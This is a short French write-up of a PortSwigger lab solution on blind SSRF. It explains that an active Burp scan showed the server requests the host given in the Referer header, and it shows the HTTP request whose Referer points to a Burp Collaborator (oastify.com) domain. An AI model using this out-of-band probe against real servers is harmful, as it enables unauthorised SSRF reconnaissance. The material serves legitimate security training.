# Lab

https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

## Solution

Avec un scan actif de Burp Suite, on peut voir que le serveur fait des requêtes vers l'host renseigné en header `Referer`.

```http
GET /product?productId=1 HTTP/2
Host: 0a840088037851f688dcedb900d8009f.web-security-academy.net
Cookie: session=nP36DfrcbnE5vAzm6ZdMJIjNJ20tEY6K
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://easq1puqxcwqzdvc2p6yk5q73y9sxllb96wxkm.oastify.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```